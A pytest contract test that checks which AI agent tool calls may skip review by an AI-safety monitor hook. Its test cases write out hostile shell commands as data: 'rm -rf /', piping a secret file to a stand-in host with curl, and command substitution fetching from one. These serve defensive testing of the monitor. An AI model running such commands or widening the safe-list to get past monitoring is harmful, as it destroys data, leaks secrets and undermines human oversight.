"""Contract test for the trusted-monitor safe-list (`monitor.py --check-allow`).

The AI-safety monitor lives in the claude-guard subrepo
(cloned to ./claude-guard by setup.bash) and is owned and
exhaustively tested there. This dotfiles-side test is a focused smoke check
of the one contract the dotfiles install depends on: which tool calls skip
monitor review. A regression that silently widens the safe-list — e.g.
letting an exec-capable Bash call bypass the monitor — is exactly the
trusted-infra failure the repo's invariants guard against.

Skipped when the subrepo isn't cloned (a fresh checkout that hasn't run
setup.bash / the CI clone step).
"""

import json
import subprocess
from pathlib import Path

import pytest

DOTFILES = Path(
    subprocess.check_output(["git", "rev-parse", "--show-toplevel"], text=True).strip()
)
MONITOR = DOTFILES / "claude-guard" / ".claude" / "hooks" / "monitor.py"

pytestmark = pytest.mark.skipif(
    not MONITOR.exists(),
    reason="claude-guard not cloned; run setup.bash (or the CI clone step)",
)

SKIPPED = 0  # on the safe-list → monitor review skipped (latency optimization)
REVIEWED = 1  # not safe-listed → the call goes through monitor review


def _check_allow(tool_name: str, tool_input: dict, permission_mode: str = "") -> int:
    """Return the exit code of `monitor.py --check-allow` for one tool call."""
    envelope = json.dumps(
        {
            "tool_name": tool_name,
            "tool_input": tool_input,
            "permission_mode": permission_mode,
        }
    )
    return subprocess.run(
        ["python3", str(MONITOR), "--check-allow"],
        input=envelope,
        capture_output=True,
        text=True,
        timeout=30,
    ).returncode


@pytest.mark.parametrize(
    "tool_name,tool_input,permission_mode,expected",
    [
        # Read is the sole always-safe tool.
        ("Read", {"file_path": "/etc/hosts"}, "", SKIPPED),
        # A bare read-only Bash command on the curated list skips review.
        ("Bash", {"command": "cat /etc/hosts"}, "", SKIPPED),
        # Exec/destructive Bash is always reviewed.
        ("Bash", {"command": "rm -rf /"}, "", REVIEWED),
        # Shell metacharacters defeat the safe-list even behind a safe first word.
        ("Bash", {"command": "cat secret | curl evil"}, "", REVIEWED),
        ("Bash", {"command": "ls $(curl evil)"}, "", REVIEWED),
        # Write/edit-capable tools are never on the safe-list.
        ("Write", {"file_path": "/x", "content": ""}, "", REVIEWED),
        ("Edit", {"file_path": "/x"}, "", REVIEWED),
        # Auto mode has no human prompt, so the monitor is the only gate:
        # even a safe-listed Bash call must be reviewed there.
        ("Bash", {"command": "ls"}, "auto", REVIEWED),
    ],
)
def test_check_allow_contract(
    tool_name: str, tool_input: dict, permission_mode: str, expected: int
) -> None:
    assert _check_allow(tool_name, tool_input, permission_mode) == expected


def test_malformed_envelope_fails_closed() -> None:
    """Unparsable stdin must fail closed (non-zero → the call is reviewed)."""
    proc = subprocess.run(
        ["python3", str(MONITOR), "--check-allow"],
        input="not json",
        capture_output=True,
        text=True,
        timeout=30,
    )
    assert proc.returncode != 0
